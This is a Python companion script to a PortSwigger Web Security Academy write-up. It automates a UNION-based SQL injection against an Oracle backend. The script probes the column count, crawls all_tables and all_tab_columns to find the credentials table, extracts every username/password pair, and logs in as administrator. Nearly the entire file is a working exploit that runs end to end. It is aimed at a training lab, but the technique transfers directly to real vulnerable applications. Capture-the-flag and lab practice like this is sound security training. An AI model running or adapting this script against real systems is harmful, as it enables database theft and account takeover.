#!/usr/bin/env python3
"""
SQL injection attack, listing the database contents on Oracle
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 06-list-database-contents-oracle.md

What this does:
    Confirms the UNION column count and text column, then crawls Oracle's data
    dictionary (all_tables / all_tab_columns -- Oracle has no
    information_schema) to find the credentials table, extracts every
    username/password pair, and logs in as administrator.

Usage:
    python 06-list-database-contents-oracle.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

MAX_COLS = 10


def detect_union_cols(client: httpx.Client, url: str) -> tuple[int, int]:
    column_count = 0
    for n in range(1, MAX_COLS + 1):
        nulls = ",".join(["NULL"] * n)
        r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {nulls} FROM DUAL-- "})
        if r.status_code == 200 and "error" not in r.text.lower()[:200]:
            column_count = n
            break
    if not column_count:
        raise RuntimeError("Could not determine column count")

    probe = "SQLI_COL_PROBE"
    string_col_index = 0
    for i in range(column_count):
        parts = ["NULL"] * column_count
        parts[i] = f"'{probe}'"
        r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {','.join(parts)} FROM DUAL-- "})
        if probe in r.text:
            string_col_index = i
            break
    return column_count, string_col_index


def union_extract(client: httpx.Client, url: str, column_count: int, string_col_index: int, expr_and_from: str) -> str:
    parts = ["NULL"] * column_count
    parts[string_col_index] = expr_and_from
    r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {','.join(parts)}-- "})
    return r.text


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    column_count, string_col_index = detect_union_cols(client, lab_url)
    print(f"[+] Columns: {column_count}, text column index: {string_col_index}")

    tables_html = union_extract(
        client, lab_url, column_count, string_col_index,
        "'XMKX'||table_name||'XMKX' FROM all_tables WHERE owner NOT IN "
        "('SYS','SYSTEM','XDB','CTXSYS','MDSYS','OLAPSYS','ORDDATA','OUTLN','WMSYS','DBSNMP','APPQOSSYS')",
    )
    tables = list(dict.fromkeys(re.findall(r'XMKX([a-zA-Z_][a-zA-Z0-9_]*)XMKX', tables_html)))
    users_table = next((t for t in tables if "user" in t.lower()), None)
    if not users_table:
        raise RuntimeError(f"Could not find a users table among: {tables}")
    print(f"[+] Users table: {users_table}")

    # Oracle identifiers are stored upper-case unless quoted at creation time.
    users_table_upper = users_table.upper()
    cols_html = union_extract(
        client, lab_url, column_count, string_col_index,
        f"'XMKX'||column_name||'XMKX' FROM all_tab_columns WHERE table_name='{users_table_upper}'",
    )
    columns = list(dict.fromkeys(re.findall(r'XMKX([a-zA-Z_][a-zA-Z0-9_]*)XMKX', cols_html)))
    user_col = next((c for c in columns if "user" in c.lower() or "name" in c.lower()), "USERNAME")
    pass_col = next((c for c in columns if "pass" in c.lower()), "PASSWORD")
    print(f"[+] Columns: {columns} -> using {user_col} / {pass_col}")

    creds_html = union_extract(
        client, lab_url, column_count, string_col_index,
        f"'XMKX'||{user_col}||'~'||{pass_col}||'XMKX' FROM {users_table_upper}",
    )
    creds = re.findall(r'XMKX([a-zA-Z0-9_~]+)XMKX', creds_html)
    admin_pass = next((c.split('~')[1] for c in creds if 'administrator' in c.lower() and '~' in c), None)
    if not admin_pass:
        raise RuntimeError(f"Could not find administrator's row among: {creds}")
    print(f"[+] administrator's password: {admin_pass}")

    csrf = get_csrf(client, f"{lab_url}/login")
    r = client.post(f"{lab_url}/login", data={"username": "administrator", "password": admin_pass, "csrf": csrf})
    if "Log out" in r.text or "/my-account" in str(r.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed with the extracted password.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
